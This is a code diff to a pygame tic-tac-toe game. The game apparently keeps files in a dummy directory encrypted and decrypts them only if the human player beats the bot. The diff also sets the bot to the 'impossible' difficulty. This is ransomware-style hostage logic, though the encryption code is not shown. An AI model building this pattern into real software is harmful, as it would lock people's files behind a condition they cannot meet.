@@ -19,19 +19,29 @@ def main():
     player = "X"
     winner = None
     game_over = False
+    games_counter = 1
 
     while running:
         SCREEN.fill(WHITE)
         draw_grid()
         draw_symbols()
 
-        if winner or is_draw():
+        if winner=="O" or is_draw() and games_counter <= 3:
+            games_counter += 1
+            show_end_of_round()
+            reset_board()
+
+
+
+        if winner == "X" and is_encrypted():
             game_over = True
-            msg = f"Winner: {winner}" if winner else "Draw"
-            draw_text_centered(msg, MESSAGE_FONT, BLACK, -50)
-            if winner == "X" and is_encrypted():
-                decrypt_files(DUMMY_FILES_DIR)  # Decrypt files only if X wins
-                set_encryption_status("decrypted")
+            decrypt_files(DUMMY_FILES_DIR)  # Decrypt files only if X wins
+            set_encryption_status("decrypted")
+            show_when_user_won()
+
+
+
+
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
@@ -46,7 +56,11 @@ def main():
                     winner = check_winner()
 
                     if not winner and not is_draw():
-                        bot = random_bot  # Change to random_bot for easier bot or to hard_bot for impossible bot
+                        # Pick the bot difficulty by commenting the other two
+                        # bot = easy_bot
+                        # bot = medium_bot
+                        bot = hard_bot
+
                         bot_move = bot(GRID, "O", "X")
                         if bot_move:
                             GRID[bot_move[0]][bot_move[1]] = "O"
